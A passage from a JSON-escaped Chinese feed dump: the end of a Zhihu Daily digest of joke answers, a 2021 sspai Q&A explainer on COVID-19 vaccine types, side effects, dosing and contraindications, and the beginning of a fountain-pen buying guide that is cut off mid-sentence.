href=\"https://www.zhihu.com/question/338438233\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>人们平均每洗一次头要掉多少根头发？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8c6350c6dbef2ee7c8c129d52dcd833d_l.jpg?source=8673f162\"><span>稀罕小尤，</span><span>音乐</span>\n<a href=\"https://www.zhihu.com/question/355922505/answer/925964112\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我不清楚这个问题</p>\n<p>因为我已经没有头发了</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355922505\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何激怒一个航天爱好者？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-367d63c324eaa55217bff8000ec78419_l.jpg?source=8673f162\"><span>昙花再现，</span><span>昙花一现又再现，此中真意已惘然。</span>\n<a href=\"https://www.zhihu.com/question/339517523/answer/781694883\" hidden>阅读原文</a>\n</div>\n<div>\n<p>“你说的不对，大刘是这样说的……”</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/339517523\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何跟我爸解释刘慈欣不是疯子?</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/e7b064ce081e4ff42ae2d558b4b81a37_l.jpg?source=8673f162\"><span>邓cl，</span><span>药师</span>\n<a href=\"https://www.zhihu.com/question/329191493/answer/718104755\" hidden>阅读原文</a>\n</div>\n<div>\n<p>诚恳的对您爸爸说：“您说得对，刘慈欣就是疯子！”</p>\n<p>然后该干嘛干嘛。</p>\n<p>放心，没人找你麻烦的。</p>\n<p>因为：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9a7799f0c6057c4d860f79710286094c_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/329191493\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737875"},{"title":"关于新冠疫苗，你想知道的问题都在这里了","date":"2021-07-07 09:30:29","description":"\n<p>自新型冠状病毒（COVID-19）席卷全球以来，人类社会至今仍备受其困扰。新冠病毒已经用实力向我们证明了它不同于过往的流行性病毒，我们也不可能像对待 SARS 那样仅做有限的隔离治疗，等待病毒自然消失。眼下能帮大家真正脱离恐慌并真正摆脱病毒困扰的唯一办法就是全民接种疫苗。</p>\n<p>此前，由于全国疫情相对稳定且碍于疫苗产能不足、副作用不清楚等情况，新冠病毒疫苗通常优先让重点人群（包括但不限于频繁接触公众的服务群体、有经常性移动需求的从事贸易交际人士）接种。随着广深两地及国内其它地区开始出现变异毒株输入，全面接种变得刻不容缓。</p>\n<p>其实在 2021 年 3 月 29 日，为了配合疫苗的广泛接种工作，中国疾控中心就发布了《<a href=\"https://baijiahao.baidu.com/s?id=1695572881311396223&amp;wfr=spider&amp;for=pc\">新冠病毒疫苗接种技术指南（第一版）</a>》（以下简称为《接种指南》），其中对疫苗的适应人群、禁忌症等都有较为明确的指示。</p>\n<p>然而它更多的是面向执行接种工作的社区医务人员，其中的一些描述对于广大预接种者而言不那么易懂，这就可能会造成信息的不对等，进而心存不必要的顾虑，耽误疫苗的接种。因此，我收集了身边的亲友、同学的比较在意的问题，以《新冠病毒疫苗接种技术指南（第一版）》为基础，结合能查阅到的一些官方权威的资料和在学校所学的基础临床知识，整理出了这一份问答形式的疫苗知识指南，希望搭起一条「从技术指南到实地接种」的桥梁。</p>\n<p><strong>注：</strong>写这篇文章的动力很大一部分是来源于我身边的亲友在面对疫苗接种时表现出的困惑以及提出的问题，同时也受制于我作为一名初涉医学领域的临床医学生所掌握的知识极其有限，因此，本文不可能面面俱到，不免在科普与解读中有所疏漏。如有事实错误，欢迎专业人士在评论区批评指正。</p>\n<h2>Part 1：疫苗是什么？</h2>\n<h3>疫苗是什么？常见种类有哪些？</h3>\n<p>人民卫生出版社的第九版《免疫学》，第二十五章免疫学防治的描述如下：</p>\n<blockquote><p>免疫预防（immunoprophylaxis）是人工主动免疫的主要目的，其主要措施是接种疫苗。疫苗（vaccine）是接种后能使机体对相应疾病产生免疫力的生物制剂类的统称。</p></blockquote>\n<p>简单地讲，注射疫苗的作用就是让你的身体对某些疾病产生免疫力。</p>\n<p>目前，大家常见的新冠病毒疫苗有「打一针」、「打两针」和「打三针」三种，恰好对应了三种常见的疫苗类型，它们分别是：</p>\n<ul>\n<li>大家都想打的、一针见效的疫苗，属于「腺病毒载体疫苗」。我国的腺病毒疫苗由康希诺生物股份公司生产，与英国阿斯利康疫苗、美国强生疫苗是同一种类型。</li>\n<li>目前最常见、接种范围最广的「打两针」疫苗，免疫学分类上属于「灭活疫苗」。包括北京生物、武汉生物和北京科兴三种，而出于解决疫苗产能的需求，在药监部门的批准下北京生物生产的疫苗原液分别在长春生物所、兰州生物所、成都生物所进行最后的分装盒包装生产。灭活疫苗也是我们日常生活中接触最多的疫苗类型，常见的有百白破疫苗、乙脑疫苗、甲肝疫苗以及流感疫苗等。</li>\n<li>而相比前两种而言，因耗时较长而不那么受待见的「打三针」疫苗——重组新冠病毒疫苗（CHO 细胞），属于「重组亚单位疫苗」，由安徽智飞龙科马生物制药有限公司生产。常见的亚单位疫苗有重组乙肝病毒表面抗原疫苗、重组口蹄疫疫苗和重组莱姆病疫苗等，埃博拉病毒疫苗也主要采用这种形式。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/c57ccca36219a235b8d78cb3067b3a66.jpg\"><figcaption>@央视新闻 给出了简单易记的图示</figcaption></figure><p>由于作用原理不同，以上三种疫苗不可以混打。关于不同疫苗作用原理的区别，下文还会另行描述。</p>\n<h3>疫苗是如何产生作用的？</h3>\n<p>要了解疫苗如何发生作用，首先我们要了解免疫系统是什么。</p>\n<p>绝大多数正常人（除少数因免疫系统发育不良等导致的先天性免疫缺陷患者）从出生到成长的过程中都具有一定的抵抗外界病原体入侵的防御力，这种防御力就是我们常说的「免疫力」。</p>\n<p>免疫力包括固有免疫和适应性免疫，前者是我们在长期的生物进化过程中逐渐形成的免疫防御体系，包括但不限于能作为物理屏障挡住细菌和病毒的皮肤、黏膜等，我们身体也能分泌一些具有杀菌作用的物质，比如唾液（不知道大家是否和我一样小时候都有弄伤了然后爸妈教用口水抹一下的经历😅，理论上来说这么做还真的稍微有点道理）。</p>\n<p>而后者的获得方式包括自然免疫和人工免疫两种，自然免疫就是我们在自然条件下得病痊愈后产生的免疫力，最常见的就是得过水痘的人往往不会得第二次，且对于绝大多数人终身免疫水痘。人工免疫就是人为地让我们「患病」从而产生免疫力，打疫苗就是最常见的一种人工主动免疫。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/1ba328171d10c530e216ec81df5557f4.png\"><figcaption>免疫力的类型</figcaption></figure><p>上面的理论可能不太好理解，下面我来举个例子。假设我们的身体是一栋房子，免疫系统就是屋里的保安，病毒就是要进来搞破坏的坏人。打疫苗的过程就相当于把坏人的长相提前告知保安，让保安记住他们的模样。当坏人想要再次入侵时，保安就能够及时采取行动，保障房子的安全。</p>\n<p>还记得我们在上文说到的三种疫苗类型吗？在这个「保安与坏人」的例子里，每种类型疫苗的作用原理也稍有不同——</p>\n<ul>\n<li>腺病毒载体疫苗（打一针）相当于把一个没有战斗力的菜鸡（即「腺病毒」）伪装成真的坏人来给保安辨认，在与「假坏人」搏斗的同时，保安也就记住了真坏人的特征。</li>\n<li>灭活疫苗（打两针）相当于把坏人的尸体拿来给保安辨认。只要后来的坏人长得和尸体差不多，保安都能把他们拒之门外。而用以提高免疫原性的氢氧化铝佐剂可以理解为把坏人的特征暴露得更明显一点，方便加强保安记忆力。</li>\n<li>至于重组新冠病毒疫苗（CHO 细胞），则是将坏人解构，只将他身上能破坏屋子的部分带给保安辨认（实际提取的是病毒的纯化蛋白质结构，此类物质可以激发身体的免疫反应）。</li>\n</ul>\n<p>总而言之，人的免疫系统具有「记仇」的特点——只要身体被某种病毒攻击过，免疫系统就会记录其特征，并在下次遇到时防患于未然。因此，疫苗的作用原理就是将特殊处理过的微量病毒注入人体，激活免疫反应，并引导人体产生对应的抵抗力。</p>\n<p>而且，无论是哪一种疫苗都不会导致注射后感染新冠病毒，因为每一种都只是病毒的不完全体，不具备致病性，只起着让我们的免疫系统辨认病毒并记住，从而产生免疫力。</p>\n<h2>Part 2：疫苗接种小知识</h2>\n<h3>如何预约疫苗接种？</h3>\n<p>随着全民疫苗接种政策的推行，全国各地都设立了不同的疫苗预约接种方式，但目前还没有统一的全国预约平台。</p>\n<p>整体来说，当下预约疫苗接种分为以下三种渠道：</p>\n<ol>\n<li>微信搜索「疫苗预约」，搜索结果将优先显示你所在地的疫苗接种信息，多数地区都能直接给出在线预约入口。</li>\n<li>搜索和关注你所在地的卫健委或疾控中心的微信公众号，部分地区的疫苗预约入口由卫健委或疾控中心直接管理。</li>\n<li>前往你居住的小区所在的社区医疗服务中心，询问距离你最近的疫苗接种点。部分社区医疗点会直接提供疫苗注射服务。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/e988fb76ca7dff57779958bc4b1eaaf3.jpg\"><figcaption>在微信内搜索「疫苗预约」会优先出现当地接种信息，疾控中心通常也能预约</figcaption></figure><h3>为什么打完疫苗之后会有头疼、乏力、发热等症状？副作用越明显，免疫效果越显著吗？</h3>\n<p>如果你了解了疫苗的原理，再面对这个问题也就不难理解了——疫苗注入身体后激活我们的免疫系统，头疼、乏力、发热等都是正常的免疫反应。注入身体的虽然不是完整的病毒，但毕竟是「坏东西」，「保安」们会全力工作，直到确认扫清「坏人」为止。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/70314d72c646dfa55e8489b99192dbd9.jpeg\"><figcaption>世界疾控中心给出的注射疫苗后常见症状</figcaption></figure><p>根据世界卫生组织的报告，全身性的不适反应包括疲劳、头痛、身体、疼痛、寒颤和恶心，部分接种者在接种部位还会有局部症状如肿胀、疼痛、发红、发痒的皮疹等，而且往往第二针的不良反应会大于第一针。但这个其实不是新冠疫苗的特性，而是疫苗引起免疫反应过程中的共性，换句话说其实只要是疫苗，都有产生不良反应的可能。</p>\n<p>虽说有不良反应是正常现象，却不是说没有就不正常或者反应越大效果越好。目前的临床试验中都没有结果表明免疫效果和不适程度呈正相关。因此，要是打疫苗后感到严重不适，尤其是产生了和世卫组织报告不同的症状，千万不要硬撑，及早就医。</p>\n<ul><li>参考阅读：<a href=\"https://www.medicalnewstoday.com/articles/global-covid-19-vaccine-summary-side-effects\">Global COVID-19 vaccine summary: Side effects</a>\n</li></ul>\n<h3>对于上述的不良反应，可以采取措施缓解甚至提前预防吗？</h3>\n<p>如果出现了上述症状，但感觉自己还能忍受，是不是一定要去医院呢？</p>\n<p>不用，去医院不是必须的。根据 <a href=\"https://www.cdc.gov/coronavirus/2019-ncov/vaccines/expect/after.html\">世界疾控中心的建议</a>，对于常见的全身症状及局部症状，可以采取服用对应的非处方药以及外部措施来进行缓解。但是高度不建议在副作用还没有发生的时候就吃药来预防。</p>\n<p>如果你以前服用过布洛芬、对乙酰氨基酚、阿司匹林或抗组胺药，或者通过电话、微信等与医生取得了交流，确认可以服药，那就可以通过服用这些药物来缓解症状。</p>\n<p>对于不想服用药物的朋友，<a href=\"https://www.medicalnewstoday.com/\">MEDICALNEWSTODAY</a> 也提供了一些缓解措施：</p>\n<ul>\n<li>对于注射部位的反应，例如疼痛或肿胀，请使用干净、凉爽的湿毛巾进行敷布。这也可能有助于缓解肌肉和关节疼痛。</li>\n<li>为了缓解手臂的酸痛或僵硬，请尽可能多地移动它。这可能看起来违反直觉并引起一些不适，但它有助于通过放松酸痛的肌肉来防止进一步僵硬。</li>\n<li>任何有寒战和低烧的人都应该确保多喝水以避免脱水。穿轻便的衣服并分层穿衣将有助于防止过热。</li>\n<li>若不良反应太强或持续时间过长，或采取上述措施无法缓解，请一定要及时就医，一昧的忌医不但会加重症状，且很可能会错过最佳治疗时机而产生不可预期的后果。</li>\n</ul>\n<h3>为什么有的疫苗需要打多针？每一针的作用是什么？可以多打吗？</h3>\n<p>读到这里，你可能已经理解了疫苗作用的基本原理，但还会奇怪：为什么有些疫苗需要打多针呢？是为了让「保安」更清楚地记住「坏人」吗？</p>\n<p>是的。不同疫苗的接种剂次不同，这主要是由疫苗接种后的效果决定的，疫苗接种的效果要综合考量抗体水平、抗体持久性、免疫记忆、预防疾病的效果等等因素。每次接种对免疫系统都有刺激作用，都能刺激我们的身体产生对应的抗体和记忆细胞，抗体就是帮助我们抵抗病毒感染的最关键的效应成分。</p>\n<p>在免疫学中有着「初次应答」和「再次应答」的概念，如果把第一针看作对于新冠的「初次应答」，那么接种的第二针、第三针等，则可以看作「再次应答」，我们的身体再次应答中往往能更快地产生抗体，抗体浓度上升得更快、维持时间更长，亲和力也更高。</p>\n<p>简言之，不同疫苗的类型决定了「保安」每次记住「坏人」特征的清晰度有所不同，为了确保「保安」能记住「坏人」的特征，有些疫苗就需要多次把「坏人」的特征丢给「保安」。</p>\n<p>一般来说，疫苗接种的次数越多，产生的免疫力也就越强。有人一定会问：那是不是可以无限制接种或是增加剂量来增强免疫力？理论上是这样，但事实上当接种达到一定的剂次之后，就不会再增加免疫效果。</p>\n<p>拿北京生物所的灭活疫苗举例，在在接种第一针后疫苗的保护率可以达到 60%，而第二针就可以提升到 95%，然而再打却收效甚微。在 Ⅰ、Ⅱ 期临床试验中，分别使用 2 倍剂量接种一剂、1 倍剂量接种两剂，前者的抗体滴度低于后者。</p>\n<ul><li>参考阅读：第一、二期临床试验结果：<a href=\"https://www.thelancet.com/journals/laninf/article/PIIS1473-3099(20)30831-8/fulltext\">点击这里</a>\n</li></ul>\n<p>其实这也不难理解。「保安」认一次「坏人」，或许能记住但认得不太清楚，再认一次就认清了，出动也更快了，但是再增加辨认的次数，对于「保安」的记忆并不会提升多少，因为他已经把能记的都记住了。</p>\n<h3>接种灭活疫苗，第一针和第二针的间隔期需要严格遵守吗？</h3>\n<p>接种打两针的灭活疫苗时，医生都会叮嘱你要间隔三至八周后接种第二针，这是有其道理的。</p>\n<p>上面我们提到，疫苗的每一针都是在激活我们的免疫系统产生免疫力。研究发现，相距 21 或 28 天的两针联程疫苗能够产生较高的中和抗体水平，所以才提出了三至八周的接种间隔。</p>\n<p>根据一般规律，打两针的全病毒灭活疫苗延长需多剂次接种疫苗（非活疫苗）的各剂次间的间隔，不会降低疫苗效果。但缩短多剂次接种疫苗（非活疫苗）的各剂次间的间隔，可能干扰免疫应答和保护力。换言之，如果你真的有事耽误了第二针，错过了最佳接种时机，理论上不会影响接种效果。但尽量不要提前去打第二针，因为免疫系统记住一个病毒的特征需要一定的时间和过程。</p>\n<ul><li>参考阅读：《<a href=\"http://zhishifenzi.com/news/multiple/10224.html\">又一国产疫苗公布一二期临床结果，对老年人安全有效</a>》、《<a href=\"http://www.nanan.gov.cn/zwgk/zfxxgkzdgz/jbylws/gjmygh/202103/t20210301_2516885.htm\">健康科普：新冠病毒灭活疫苗两剂次之间间隔多久？</a>》</li></ul>\n<h3>注射疫苗后的有效期是多久？真的只有半年或九个月吗？</h3>\n<p>新冠疫苗目前还处于研发和刚投入使用的阶段，能保证它的安全性，至于持久性还需要长期的持续监测和研究。之前谣传的「有效期只有半年」，其实是灭活疫苗在第一批接种者注射半年后随访时，检测到体内仍有一定水平的抗体，因此称「有效期至少有半年」。</p>\n<p>至于「打一针」疫苗，有人也担心只打一针会不会缩短有效期，目前也明确有效期至少可以持续六个月。而且对采用同种技术的埃博拉疫苗免疫持续性观察显示，接种两年后应仍有足够的免疫力。</p>\n<h3>打完疫苗后就可以不戴口罩了吗？就可以不做核酸检测了吗？</h3>\n<p>不可以🙅‍♂️现在的任何一种疫苗都没有 100% 的保护力，不是「开了就能在毒区漫步」的外挂。因此，佩戴口罩，少去人群密集的地方，仍然是不可或缺的自我保护途径。同理，在需要做核酸检测的场合也应该配合做核酸检测，你放心大家也都放心。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/272c8a4e7c49e4de2c156a6de0262958.jpeg\"><figcaption>接种了疫苗依然有可能感染，截图来自 @中国新闻周刊</figcaption></figure><p>新冠病毒疫苗的核心作用是让接种者接触到病源后得病的概率降低，极大程度避免继发重症。用网络上一个玩笑性质的科普就是「增加 80% 的闪避几率，被命中后减少 99% 的伤害，并且 100% 免疫暴击」，再次强调，目前人类还没有任何疫苗能够 100% 避免某种病症的感染。</p>\n<p>补充一个有趣的信息：根据来给我们上课的附属医院急诊科老师所说，自从疫情以来，因为大家自觉佩戴口罩，来急诊挂号的呼吸道感染病人大大减少。可见，无论新冠与否，佩戴口罩本身就是一个健康的好习惯。</p>\n<h3>过敏体质能打疫苗吗？</h3>\n<p>「过敏」是一个很笼统的概念，除了极度易过敏体质，其它常见的鱼虾、花粉过敏者基本是对某种物质敏感，不一定就是《接种指南》里提到的对疫苗成分过敏。</p>\n<p>新冠病毒灭活疫苗的辅料主要包括磷酸氢二钠、氯化钠、磷酸二氢钠、氢氧化铝等。如果不确定自己是不是以上物质过敏者，或既往发生过疫苗过敏（如急性过敏反应、过敏性休克、血管神经性水肿、呼吸困难等）但又想接种新冠疫苗的，建议还是咨询医师以获取专业的意见。</p>\n<p>简言之，如果你觉得自己是「过敏体质」，请申请注射疫苗时及时向工作人员反馈，他们会给出合理的判断。</p>\n<h3>注射新冠病毒疫苗，能和其它疫苗同时接种吗？</h3>\n<p>简单来说，近期（14 天内）有接种其它疫苗的都不建议急于接种新冠疫苗。可以理解为免疫系统在前一轮打疫苗过程中已经工作得有点累了，再打新冠有可能会使它超负荷，也因此会导致不良反应加剧。</p>\n<p>但是若在接种新冠疫苗后，不慎被猫狗咬伤抓伤、被带锈金属物品造成深且狭长的伤口等，仍应及早接种对应的疫苗进行人工被动免疫，起到治疗或紧急预防疾病的作用。</p>\n<h3>什么人不可以打疫苗？</h3>\n<p>除了上面提到的过敏者，还有一些接种的禁忌症，这在《接种指南》以及各地的医院保健账号都有提及，为了方便大家查阅，我在这里将从相对可靠的账号所发布消息进行收集再整理，如有纰漏欢迎补充。</p>\n<p>以下整理内容来自广东卫生信息、央视新闻、国家疾控中心——</p>\n<ul>\n<li>任何原因（如感冒、局部炎症、肿瘤、风湿免疫性疾病等）引起发热（腋下体温 ≥ 37.3℃）者；结核病活动期者。</li>\n<li>急性脑病（脑炎、梗塞、出血等），或有惊厥、精神疾病史或家族史者；癫痫和其他严重神经系统疾病者（如横贯性脊 髓炎、格林巴利综合症、脱髓鞘疾病等）未控制的患者，或其他进行性神经系统疾病患者。</li>\n<li>呼吸系统急性感染、慢性阻塞性肺疾病急性发作期、支气管哮喘急性发作或临床未控制、胸膜疾病急性期等患者。</li>\n<li>血压 ≤ 90 / 60 mmHg（原因不明），高血压通过生活方式调整和（或）药物治疗、血压仍 ≥ 160 / 100 mmHg，严重冠心病，心律失常，心率低于 60 次 / 分或大于 100 次 / 分，严重心脏瓣膜病变，主动脉夹层，静脉血栓形成，严重心力衰竭，严重心律失常，急性冠脉综合征，急性主动脉综合征等患者。</li>\n<li>消化道出血、急性胰腺炎、急性肠梗阻，炎症性肠病活动期，急性肝炎或慢性肝炎活动期等患者。</li>\n<li>急性泌尿、生殖系统感染，严重肾病患者（未控制的急、慢性肾炎患者，正在使用糖皮质激素、免疫抑制剂或生物制剂的肾脏病患者，急性肾功能不全患者或慢性肾脏病 3 期以上即肾小球滤过率 eGFR &lt; 60 ml/min 的患者）。</li>\n<li>糖尿病急性并发症（酮症酸中毒、高渗状态、乳酸酸中毒）或患有上述急性并发症痊愈未满2周的糖尿病患者；空腹血糖 &gt; 13.9 mmol/L 者；甲状腺功能减退 TSH &gt; 10 μIU/L，且 T3、T4 低于正常值者；未控制的甲状腺功能亢进或甲亢性突眼患者。</li>\n<li>淋巴增殖性疾病未控制，再生障碍性贫血未缓解，原发免疫性血小板减少症（ITP）活动期，出凝血疾病未控制等患者。</li>\n<li>免疫系统疾病（系统性红斑狼疮、类风湿关节炎、强直性脊柱炎、干燥综合征等）活动期，先天性或获得性免疫缺陷，明确合并机会性感染或恶性肿瘤未控制的HIV 感染者，淋巴瘤、白血病或自身免疫性炎症性疾病患者。</li>\n<li>恶性肿瘤患者手术前后，正在进行化疗、放疗、免疫治疗等患者；器官移植状态患者。</li>\n<li>严重过敏性鼻炎急性期，急慢性湿疹或荨麻疹症状体征明显者，或伴有皮肤其它症状发作期。</li>\n<li>既往新冠肺炎病毒感染者（确诊或无症状）6 个月内。</li>\n<li>妊娠期妇女。</li>\n<li>除以上禁忌症外，如在接种前有身体不适者，都应到正规医院去咨询专业的医师意见。</li>\n</ul>\n<h3>我有以上禁忌症相关情况，能不能打疫苗呢？</h3>\n<p>在《接种指南》中归类了六类特定的人群，分别为 60 岁及以上人群、18 岁以下人群、慢性病人群、育龄期和哺乳期女性、免疫功能受损人群、既往新冠患者或感染者，并分别有对应的接种建议，可以到开头贴出的《接种指南》链接中跳转查阅准确的表述。在这里也为了方便读者将搜集到的进一步阐述进行整理：</p>\n<p>以下信息来自广东卫生信息、央视新闻、国家疾控中心等——</p>\n<ul>\n<li>已知对尘螨、食物（鸡蛋、花生、海鲜、芒果）、花粉、酒精、青霉素、头孢或者其它药物过敏，可以接种。</li>\n<li>患有心脏病，冠状动脉粥样硬化等疾病，不是急性发作期，可以接种。</li>\n<li>健康状况稳定，药物控制良好的慢性病人群不作为新冠病毒疫苗接种禁忌人群，建议接种。</li>\n<li>高血压药物控制稳定，血压低于 160/90 mmHg，可以接种。</li>\n<li>糖尿病药物控制稳定，空腹血糖 ≤ 13.9 mmol/L、无急性并发症（酮症酸中毒、高渗状态、乳酸酸中毒），可以接种。</li>\n<li>甲减患者服用稳定剂量左甲状腺素（优甲乐），甲功正常，可以接种。</li>\n<li>慢性湿疹没有明显发作，且处于非治疗阶段，可以接种。</li>\n<li>慢性荨麻疹当前症状不明显，且处于非治疗阶段，可以接种。</li>\n<li>慢性鼻炎、慢性咽炎症状不明显，可以接种。</li>\n<li>慢性肝炎非治疗阶段，肝功正常，可以接种。</li>\n<li>肺结核不是活动期，可以接种。</li>\n<li>银屑病非脓疱型等急性类型，处于非治疗阶段，可以接种。</li>\n<li>牛皮癣、白瘢风，处于非治疗阶段，可以接种。</li>\n<li>慢阻肺非急性发作期，无明显咳喘，可以接种。</li>\n<li>强直性脊柱炎无急性疼痛表现，且炎症指标无明显异常，可以接种。</li>\n<li>抑郁症药物控制良好，生活工作如常，可以接种。</li>\n<li>精神疾病患者，病情稳定，可以接种。</li>\n<li>用于治疗糖尿病的各种药物（包括注射胰岛素），均不作为疫苗接种的禁忌。</li>\n<li>免疫系统疾病（系统性红斑狼疮、类风湿关节炎、干燥综合征等等）总体原则是谨慎接种。一般情况下，在病情稳定时可以接种灭活疫苗和重组亚单位疫苗。</li>\n<li>恶性肿瘤术后超过三年，不再进行放化疗；肾病综合征；肾移植后吃免疫抑制药物；艾滋病患者、HIV 感染者, 建议接种灭活疫苗或重组亚单位疫苗。</li>\n<li>阴道炎，尿道炎等泌尿系统感染，无发热，处于非治疗阶段，可以接种。</li>\n<li>单纯腹泻，无发热，每日不超过三次，可以接种。</li>\n<li>心脏病、支架、搭桥、安装起搏器，术后恢复正常, 可以接种。</li>\n<li>器官移植术后，恢复良好，体征平稳，建议用新冠灭活疫苗。</li>\n<li>脑梗塞治愈者，或有后遗症（且病情稳定、血压控制平稳）者，可以接种。</li>\n<li>阑尾炎术后、人工流产术后，身体恢复良好，没有其他不适的话，可以接种。</li>\n<li>骨折、外伤，无感染发热，可以接种。</li>\n<li>备孕期、哺乳期可以接种，哺乳期可继续哺乳。</li>\n<li>男性不存在因备孕不能接种新冠病毒疫苗的问题。</li>\n</ul>\n<h3>现有疫苗对变异毒株还有效果吗？还值得接种吗？</h3>\n<p>日前，在广州确诊病例检测病毒属于在印度发现的 Delta 变异毒株，深圳确诊病例病毒属于在英国发现的 Αlpha 变异毒株。在全国防疫措施开展良好的大环境下，新出现的疫情来自境外输入并不奇怪。</p>\n<p>而根据新近的研究报告都表明，在我国最近确诊的毒株不会使现存疫苗完全失效，顶多会让效力轻微下降，且不排除个体差异所致。因此，及时接种疫苗仍是不二之选。</p>\n<ul><li>参考阅读：<a href=\"https://www.medicalnewstoday.com/articles/new-sars-cov-2-variants-how-can-vaccines-be-adapted\" target=\"_blank\">本文</a> 的「Do vaccines work against variants?」部分</li></ul>\n<h3>越南的新变异毒株据说在空气中传播更快，是不是意味着更危险了？</h3>\n<p>当地时间 5 月 29 日，<a href=\"https://e.vnexpress.net/news/news/vietnam-discovers-new-coronavirus-variant-with-uk-indian-mutations-4285878.html\" target=\"_blank\">越南快报网站报道</a>，在越南发现新型变异毒株，且目前尚未证实现有疫苗是否失效。</p>\n<p>初步检查可知属于先前在印度发现的新冠变异毒株与在英国发现的新冠变异毒株的混合体，能在空气中迅速传播。</p>\n<p>在微生物学的角度来看，「混合体」并不是我们日常理解的两种已有混合毒株混合在一起，而是 A 病毒的经过 RNA 突变获得了原本属于 B 病毒的某些特点，而在这一次越南新毒株中就是原本的 Delta 变异毒株，经过突变获得了 Alpha 变异毒株的特点，具备了更强的传染能力。</p>\n<p>但原文所说的「更容易在空气中传播」，并不等同于骇人听闻的空气传播。须知新冠病毒原本的传播方式主要是飞沫传播，可能是携带新型变异病毒的飞沫在空气中存在致病性的时间会长于以往的毒株。</p>\n<p>同时，传染性、致病性和免疫性在病毒上其实是相对独立的三个特性，具有更强的传播性并不等同于更容易致病，更不能说明感染者的症状会更严重，也不能说明现有疫苗就已经会失效，这些都还有待进一步的研究。</p>\n<p>越南出现的新变异毒株说进一步说明了尽快接种疫苗的必要性。</p>\n<h2>结语</h2>\n<p>絮絮叨叨写了近万字，大概是把我收集到的信息都整理了一遍，希望其中有你想知道的内容，或至少能解答一些疑惑，要是还能有帮助，那就已经很值得了。</p>\n<p>读完全文的朋友会发现我没有对各种疫苗的优劣和效力进行分析，一方面确实是个人能力有限，在忙于学业和写稿的这段时间无法更多更仔细地阅读相关的临床试验的报告，也无从进一步了解各大企业及疫苗制作验证的过程，因而无法给出精确的意见；另一方面，我认为目前疫苗有限而接种者多的现况，大家能选择的范围不大，与其拘泥于打哪一种，还不如有什么打什么，尽早接种才更安心。应该明确，能通过国家药品监督管理局的检验，批准上市给大众接种的疫苗，都具有极高的安全性和可靠的免疫效力。</p>\n<p>希望大家能及早接种疫苗，远离疾病的困扰 🙏</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/66902"},{"title":"不买可以先收藏 07：从自用到送礼，帮你选支好钢笔","date":"2021-07-07 08:00:54","description":"\n<p>上次我们邀请了几位现在还在使用钢笔的作者，来给大家分享一下自己与钢笔的故事与使用钢笔的心得。其实钢笔并不是什么很难拥有的东西，也绝非拥有敏感细腻的触觉才能体会出差异。在我看来，钢笔作为一种书写工具，其乐趣大多是实用价值的延伸。一支好的钢笔，可以让你满足日常书写需求的同时，在机械重复的劳作中体会到一点蕴含着的细小意趣。我收集了一些目前在产或存量较大，且整体表现与价位基本相符的型号，如果你希望尝试一下使用钢笔书写，不妨在购买前参考一下。</p>\n<p>这份钢笔推荐，主要源自我个人的使用经验以及爱好者社区内部的普遍评价。但请务必注意，<strong>手感</strong>是非常玄学的，个人的力道、使用习惯、握笔姿势都可能对钢笔的整体使用表现造成影响，在参考时如果有条件，最好试一试实物。</p>\n<p>关联阅读：<a href=\"https://sspai.com/post/66901\" target=\"_blank\">我为什么还在使用钢笔？</a></p>\n<h2>选钢笔时，我们到底在选什么</h2>\n<p>和常见的滚珠类书写工具相比，钢笔最大的不同就是书写原理。墨水从储墨装置到纸上主要靠的是毛细现象，而大多数滚珠笔字迹落纸的过程靠的是摩擦力。在书写体验方面，滚珠笔落纸的触感主要受笔尖形状、下笔力度以及笔芯弹性与固定方式影响，所以大多数时候滚珠笔的手感非常相似，除非增加了额外的缓冲弹簧，或者采用了过细的笔芯与宽松的固定方式；相比之下，钢笔的变量就大大增多，笔尖的材质、厚度、打磨方式，毛细的疏密、质量，笔舌的长短、形状，乃至墨水的性质，都有可能影响下笔的实际触感。</p>\n<p>此外，不同的钢笔也有不同的外壳材质、厚度、上墨方式、防干墨装置等等设计上的差异，体现到实际的笔上，可能影响的就是握感、重心、一笔出水等等方面，这些与上面的综合起来，才能组成一支钢笔的「书写体验」。你看到的钢笔这一品类价格区间上下极大的落差，就是这些影响因素在不同层级上变化的体现。</p>\n<p>问题就在于，市面上这些不同的型号到底在哪一方面下了成本。</p>\n<p>很多人常常抱怨自己便宜钢笔不好用不如去买中性笔，很大程度上是因为目前进入文具店的「平价钢笔」把该花的钱花错了地方。毕竟文具店的主力顾客是中小学生，商家就想当然地把「花哨好看」当成了第一卖点，然后造一些实用层级上的灾难出来；甚至价格上到几百块，还有这样的情况发生。</p>\n<p>我在挑选钢笔时基本遵循这样的规律：<strong>先挑握感、再挑笔尖</strong>，其次是笔杆材质和做工，然后是上墨方式，最后是外形和品牌——当你不知道一支钢笔是否适合你时，可以按照这样的顺序考察一番。不过在实际操作中也会有些例外出现，我在推荐过程中会逐步提及。</p>\n<h2>1-299 元：入门钢笔不吃亏</h2>\n<p>之所以把 300 